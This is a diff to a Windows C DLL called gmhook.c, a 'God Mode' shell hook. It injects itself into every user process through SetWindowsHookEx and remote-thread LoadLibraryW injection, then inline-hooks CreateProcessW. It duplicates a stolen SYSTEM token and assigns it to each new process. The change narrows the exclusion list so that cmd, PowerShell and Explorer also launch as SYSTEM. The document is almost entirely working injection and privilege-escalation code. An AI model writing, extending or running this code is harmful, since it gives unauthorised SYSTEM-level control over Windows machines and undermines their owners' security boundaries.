@@ -1,11 +1,18 @@
-/*
- * gmhook.c — God Mode Shell Hook DLL
- * Injects into explorer.exe and hooks CreateProcessW to intercept every
- * process launch before it starts executing.  The intercepted process is created
- * suspended, its primary token is replaced with a stolen SYSTEM token via
- * NtSetInformationProcess, and then the process is resumed.
+/**
+ * gmhook.c — God Mode Global Shell Hook DLL
  *
- * Build: cl /LD /O2 gmhook.c /link /EXPORT:InstallHook /EXPORT:UninstallHook user32.lib ntdll.lib advapi32.lib kernel32.lib
+ * Injects into ALL user processes via:
+ * 1. SetWindowsHookEx(WH_GETMESSAGE, ...) for automatic injection into new GUI processes
+ * 2. Explicit injection into any process via InjectIntoProcess export
+ *
+ * Hooks CreateProcessW to intercept EVERY process launch before it starts executing.
+ * The intercepted process is created suspended, its primary token is replaced with a
+ * stolen SYSTEM token via NtSetInformationProcess, and then resumed.
+ *
+ * Only the absolute core OS processes are protected from elevation.
+ * All other processes (explorer, cmd, powershell, all user apps) are elevated.
+ *
+ * Build: cl /LD /O2 gmhook.c /link /EXPORT:InstallHook /EXPORT:UninstallHook /EXPORT:GetMsgProc /EXPORT:InjectIntoProcess user32.lib ntdll.lib advapi32.lib kernel32.lib
  */
 #include <windows.h>
 #include <stdio.h>
@@ -17,13 +24,9 @@
 #pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "kernel32.lib")
+#pragma comment(lib, "user32.lib")
 #endif
 
-/* TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_QUERY, SecurityImpersonation,
-   TokenPrimary, PROCESS_QUERY_LIMITED_INFORMATION, and PROCESS_SET_INFORMATION
-   are all defined in standard Windows headers (winnt.h / winbase.h). */
-
-/* NtSetInformationProcess and ProcessAccessToken */
 #define ProcessAccessToken 9
 
 static BOOL IsSystemSid(PSID pSid) {
@@ -64,6 +67,7 @@ static BYTE origBytes[5] = {0};
 static BOOL hookInstalled = FALSE;
 static DWORD gSystemPid = 0;
 static HANDLE gSystemToken = NULL;
+static HMODULE gHModule = NULL;
 
 static BOOL EnablePrivilege(LPCWSTR privName) {
     HANDLE hToken;
@@ -138,7 +142,21 @@ static BOOL PrepareSystemToken(void) {
     return TRUE;
 }
 
-/* Intercepted CreateProcessW */
+/* Minimal critical list — only the absolute core OS processes that must never be touched */
+static BOOL IsCriticalProcess(const wchar_t* baseName) {
+    if (!baseName) return TRUE;
+    const wchar_t* critical[] = {
+        L"csrss.exe", L"lsass.exe", L"services.exe", L"smss.exe",
+        L"winlogon.exe", L"wininit.exe", L"svchost.exe", L"dwm.exe",
+        L"fontdrvhost.exe", L"System", L"Registry", L"Memory Compression",
+        L"Secure System", L"Idle", NULL
+    };
+    for (int i = 0; critical[i]; i++) {
+        if (_wcsicmp(baseName, critical[i]) == 0) return TRUE;
+    }
+    return FALSE;
+}
+
 static BOOL WINAPI HookCreateProcessW(
     LPCWSTR lpApplicationName,
     LPWSTR lpCommandLine,
@@ -151,20 +169,15 @@ static BOOL WINAPI HookCreateProcessW(
     LPSTARTUPINFOW lpStartupInfo,
     LPPROCESS_INFORMATION lpProcessInformation)
 {
-    /* Only intercept user-session processes (not SYSTEM services) */
-    /* Check if the process is being created by a non-SYSTEM user */
-    /* For simplicity, we intercept all processes and skip critical ones by name */
     if (!lpApplicationName && !lpCommandLine) {
         return pOrigCreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes,
             lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment,
             lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
     }
 
-    /* Determine executable name for filtering */
     const wchar_t* exePath = lpApplicationName;
     wchar_t parsedPath[MAX_PATH] = {0};
     if (!exePath && lpCommandLine) {
-        /* Parse first quoted or unquoted token from command line */
         const wchar_t* p = lpCommandLine;
         while (*p == L' ') p++;
         if (*p == L'"') {
@@ -185,19 +198,13 @@ static BOOL WINAPI HookCreateProcessW(
     if (baseName) {
         const wchar_t* slash = wcsrchr(baseName, L'\\');
         if (slash) baseName = slash + 1;
-        const wchar_t* critical[] = {
-            L"csrss.exe", L"lsass.exe", L"services.exe", L"smss.exe",
-            L"winlogon.exe", L"wininit.exe", L"svchost.exe", L"dwm.exe",
-            L"fontdrvhost.exe", L"powershell.exe", L"pwsh.exe", L"cmd.exe",
-            L"conhost.exe", L"explorer.exe", L"godmode.exe", NULL
-        };
-        for (int i = 0; critical[i]; i++) {
-            if (baseName && _wcsicmp(baseName, critical[i]) == 0) {
-                return pOrigCreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes,
-                    lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment,
-                    lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
-            }
-        }
+    }
+
+    /* Pass through critical OS processes untouched */
+    if (IsCriticalProcess(baseName)) {
+        return pOrigCreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes,
+            lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment,
+            lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
     }
 
     /* Ensure token is ready */
@@ -206,7 +213,6 @@ static BOOL WINAPI HookCreateProcessW(
         EnablePrivilege(L"SeImpersonatePrivilege");
         EnablePrivilege(L"SeAssignPrimaryTokenPrivilege");
         if (!PrepareSystemToken()) {
-            /* Fallback: original behavior */
             return pOrigCreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes,
                 lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment,
                 lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
@@ -247,13 +253,11 @@ static BOOL InstallInlineHook(void) {
     pOrigCreateProcessW = (CreateProcessW_t)GetProcAddress(hKernel, "CreateProcessW");
     if (!pOrigCreateProcessW) return FALSE;
 
-    /* Save original bytes */
     memcpy(origBytes, pOrigCreateProcessW, 5);
 
     DWORD oldProtect;
     if (!VirtualProtect(pOrigCreateProcessW, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) return FALSE;
 
-    /* Write JMP rel32 */
     BYTE jmp[5];
     jmp[0] = 0xE9;
     DWORD offset = (DWORD)HookCreateProcessW - (DWORD)pOrigCreateProcessW - 5;
@@ -275,19 +279,16 @@ static void RemoveInlineHook(void) {
     }
 }
 
-/* DLL Entry */
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
-    if (reason == DLL_PROCESS_ATTACH) {
-        DisableThreadLibraryCalls(hModule);
-        pNtSetInfo = (NtSetInformationProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtSetInformationProcess");
-        if (pNtSetInfo) {
-            hookInstalled = InstallInlineHook();
-        }
-    } else if (reason == DLL_PROCESS_DETACH) {
-        if (hookInstalled) RemoveInlineHook();
-        if (gSystemToken) CloseHandle(gSystemToken);
+/* GetMsgProc for SetWindowsHookEx global injection */
+__declspec(dllexport) LRESULT CALLBACK GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode >= 0 && !hookInstalled) {
+        EnablePrivilege(L"SeDebugPrivilege");
+        EnablePrivilege(L"SeImpersonatePrivilege");
+        EnablePrivilege(L"SeAssignPrimaryTokenPrivilege");
+        if (!gSystemToken) PrepareSystemToken();
+        hookInstalled = InstallInlineHook();
     }
-    return TRUE;
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
 /* Exported install/uninstall for manual injection */
@@ -297,4 +298,74 @@ __declspec(dllexport) void InstallHook(void) {
 
 __declspec(dllexport) void UninstallHook(void) {
     if (hookInstalled) { RemoveInlineHook(); hookInstalled = FALSE; }
+}
+
+/* Explicit injection helper: injects this DLL into a target process */
+__declspec(dllexport) BOOL InjectIntoProcess(DWORD pid) {
+    if (!gHModule) return FALSE;
+
+    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
+    if (!hProc) return FALSE;
+
+    wchar_t dllPath[MAX_PATH];
+    if (!GetModuleFileNameW(gHModule, dllPath, MAX_PATH)) {
+        CloseHandle(hProc);
+        return FALSE;
+    }
+
+    SIZE_T len = (wcslen(dllPath) + 1) * sizeof(wchar_t);
+    LPVOID remoteBuf = VirtualAllocEx(hProc, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!remoteBuf) {
+        CloseHandle(hProc);
+        return FALSE;
+    }
+
+    if (!WriteProcessMemory(hProc, remoteBuf, dllPath, len, NULL)) {
+        VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
+        CloseHandle(hProc);
+        return FALSE;
+    }
+
+    HMODULE hKernel = GetModuleHandleW(L"kernel32.dll");
+    LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel, "LoadLibraryW");
+
+    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pLoadLibrary, remoteBuf, 0, NULL);
+    if (!hThread) {
+        VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
+        CloseHandle(hProc);
+        return FALSE;
+    }
+
+    WaitForSingleObject(hThread, INFINITE);
+    CloseHandle(hThread);
+    VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
+    CloseHandle(hProc);
+    return TRUE;
+}
+
+/* DLL Entry */
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        gHModule = hModule;
+        DisableThreadLibraryCalls(hModule);
+        pNtSetInfo = (NtSetInformationProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtSetInformationProcess");
+        if (pNtSetInfo) {
+            /* Only install hook if this process is not critical */
+            wchar_t modName[MAX_PATH];
+            GetModuleFileNameW(NULL, modName, MAX_PATH);
+            wchar_t* baseName = wcsrchr(modName, L'\\');
+            if (baseName) baseName++; else baseName = modName;
+            if (!IsCriticalProcess(baseName)) {
+                EnablePrivilege(L"SeDebugPrivilege");
+                EnablePrivilege(L"SeImpersonatePrivilege");
+                EnablePrivilege(L"SeAssignPrimaryTokenPrivilege");
+                if (!gSystemToken) PrepareSystemToken();
+                hookInstalled = InstallInlineHook();
+            }
+        }
+    } else if (reason == DLL_PROCESS_DETACH) {
+        if (hookInstalled) RemoveInlineHook();
+        if (gSystemToken) CloseHandle(gSystemToken);
+    }
+    return TRUE;
 }
